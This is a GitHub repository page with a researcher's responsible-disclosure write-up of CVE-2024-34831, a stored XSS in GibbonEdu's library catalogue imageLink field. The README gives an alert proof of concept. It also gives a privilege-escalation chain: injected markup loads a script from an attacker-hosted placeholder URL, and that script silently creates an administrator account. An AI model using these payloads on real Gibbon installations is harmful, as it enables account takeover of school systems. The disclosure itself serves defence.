
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fenzored%2FCVE-2024-34831)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fenzored%2FCVE-2024-34831)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=enzored%2FCVE-2024-34831)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[enzored](/enzored)
/
**[CVE-2024-34831](/enzored/CVE-2024-34831)**
Public

* [Notifications](/login?return_to=%2Fenzored%2FCVE-2024-34831) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2Fenzored%2FCVE-2024-34831)
* [Star
   0](/login?return_to=%2Fenzored%2FCVE-2024-34831)

Disclosure of CVE-2024-34831

[0
stars](/enzored/CVE-2024-34831/stargazers) [0
forks](/enzored/CVE-2024-34831/forks) [Branches](/enzored/CVE-2024-34831/branches) [Tags](/enzored/CVE-2024-34831/tags) [Activity](/enzored/CVE-2024-34831/activity)
 [Star](/login?return_to=%2Fenzored%2FCVE-2024-34831)

 [Notifications](/login?return_to=%2Fenzored%2FCVE-2024-34831) You must be signed in to change notification settings

* [Code](/enzored/CVE-2024-34831)
* [Issues
  0](/enzored/CVE-2024-34831/issues)
* [Pull requests
  0](/enzored/CVE-2024-34831/pulls)
* [Actions](/enzored/CVE-2024-34831/actions)
* [Projects
  0](/enzored/CVE-2024-34831/projects)
* [Security](/enzored/CVE-2024-34831/security)
* [Insights](/enzored/CVE-2024-34831/pulse)

Additional navigation options

* [Code](/enzored/CVE-2024-34831)
* [Issues](/enzored/CVE-2024-34831/issues)
* [Pull requests](/enzored/CVE-2024-34831/pulls)
* [Actions](/enzored/CVE-2024-34831/actions)
* [Projects](/enzored/CVE-2024-34831/projects)
* [Security](/enzored/CVE-2024-34831/security)
* [Insights](/enzored/CVE-2024-34831/pulse)

# enzored/CVE-2024-34831

    main[Branches](/enzored/CVE-2024-34831/branches)[Tags](/enzored/CVE-2024-34831/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[9 Commits](/enzored/CVE-2024-34831/commits/main/) | | |
| [Gibbon\_XSS\_1.png](/enzored/CVE-2024-34831/blob/main/Gibbon_XSS_1.png "Gibbon_XSS_1.png") | | [Gibbon\_XSS\_1.png](/enzored/CVE-2024-34831/blob/main/Gibbon_XSS_1.png "Gibbon_XSS_1.png") |  |  |
| [Gibbon\_XSS\_2.png](/enzored/CVE-2024-34831/blob/main/Gibbon_XSS_2.png "Gibbon_XSS_2.png") | | [Gibbon\_XSS\_2.png](/enzored/CVE-2024-34831/blob/main/Gibbon_XSS_2.png "Gibbon_XSS_2.png") |  |  |
| [Gibbon\_XSS\_3.png](/enzored/CVE-2024-34831/blob/main/Gibbon_XSS_3.png "Gibbon_XSS_3.png") | | [Gibbon\_XSS\_3.png](/enzored/CVE-2024-34831/blob/main/Gibbon_XSS_3.png "Gibbon_XSS_3.png") |  |  |
| [README.md](/enzored/CVE-2024-34831/blob/main/README.md "README.md") | | [README.md](/enzored/CVE-2024-34831/blob/main/README.md "README.md") |  |  |
| View all files | | |

## Repository files navigation

* README
# CVE-2024-34831 XSS Vulnerability in GibbonEdu Core v26.0.00 leading to Privilege Escalation

Gibbon is an awesome open source fully fledged school management system. A lot of effort is going on in revamping the rather old code base.

Author: Christian Bajada

## **1. Vulnerability**

The `imageLink` parameter when editing/submitting new books (/modules/Library/library\_manage\_catalog\_editProcess.php) is vulnerable to XSS. Users with the Manage Catalog permission can exploit this vulnerability causing arbitrary scripts to execute for users with higher level permissions and elevate privileges.

## **2. PoC Simple Scenario**

1. Navigate to **Learn > Library > Manage Catalog**
2. Edit one of the book items.
3. The Image Link field is not properly sanitised and allows us to run arbitrary Javascript. Modify the Image Link to `[http://x](http://x/)" onerror='alert(1)'` and the alert code will execute on page load when loading the library page:

[![Gibbon_XSS_1](/enzored/CVE-2024-34831/raw/main/Gibbon_XSS_1.png)](/enzored/CVE-2024-34831/blob/main/Gibbon_XSS_1.png)

[![Gibbon_XSS_1](/enzored/CVE-2024-34831/raw/main/Gibbon_XSS_3.png)](/enzored/CVE-2024-34831/blob/main/Gibbon_XSS_3.png)

## **3. PoC for Privilege Escalation**

This section explains how this vulnerability can be used for something more dangerous other than a simple alert (1) popup. We are going to trick a logged in administrator to seamlessly create another admin, accessible by the attacker.

The `imageLink` field is too small to allow us to invoke any meaningful functionality on the Gibbon Platform. What we can do is simply host the Javascript elsewhere and have it downloaded and executed by the browser. Lack of CSP makes this possible.

1. The malicious user crafts the payload to create an administrator user as follows and places it in a publicly accessible location e.g. https://<yourserver.com>/payload.js. The below code, if executed by an administrator will create an administrative user called hexthecat. The code invokes the function on Gibbon Core to create a new user together with all required parameters.

```
fetch('./modules/User%20Admin/user_manage_addProcess.php', { method: 'POST', body: new URLSearchParams({ title: 'Mr.', surname: 'Cat', firstName: 'Hex', preferredName: 'Hex', 'officialName' : 'Hex', gender: 'M', dob: '01/04/2024', gibbonRoleIDPrimary: '001', username: 'hexthecat', passwordNew: 'Hexed001', passwordConfirm: 'Hexed001', status: 'full', canLogin: 'Y', passwordForceReset: 'Y' }) });
```

2. The malicious Mange Catalogue user enters the following imageLink for a book (keeping the original and adding the script loading part):

<http://books.google.com/books?id=SluXuAAACAAJ&printsec=frontcover&img=1&zoom=1&source=gbs_api>" onmouseover="$.getScript('https://<yourserver.com>/payload.js')"

3. Administrator browses the library.

You need to either wait until administrator navigates to the library catalog or else convince them via IM, Email or any other channel.

The act of hovering the mouse (onmouseover) on the picture of the book will cause the payload to be fetched from the location (in this case <yourserver.com>) and execute. This results in an administrator user being created which the malicious user can now access. The 'onerror' listener can also be used to have the payload execute immediately rather than having to hover over the picture.

You can check the created user in the menu **ADMIN > User Admin**

[![Gibbon_XSS_2](/enzored/CVE-2024-34831/raw/main/Gibbon_XSS_2.png)](/enzored/CVE-2024-34831/blob/main/Gibbon_XSS_2.png)

## **4. Responsible Disclosure**

Published as per responsible disclosure guidelines <https://github.com/GibbonEdu/core/security>.

* 06 May 2024: Vulnerability reported and acknowledged by GibbonEdu maintainer.
* 15 May 2024: CVE number assigned by MITRE.
* 10 September 2024: Advisory published.

## About

Disclosure of CVE-2024-34831

### Resources

[Readme](#readme-ov-file)

[Activity](/enzored/CVE-2024-34831/activity)
### Stars

[**0**
stars](/enzored/CVE-2024-34831/stargazers)
### Watchers

[**1**
watching](/enzored/CVE-2024-34831/watchers)
### Forks

[**0**
forks](/enzored/CVE-2024-34831/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fenzored%2FCVE-2024-34831&report=enzored+%28user%29)

## [Releases](/enzored/CVE-2024-34831/releases)

No releases published

## [Packages 0](/users/enzored/packages?repo_name=CVE-2024-34831)

No packages published

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

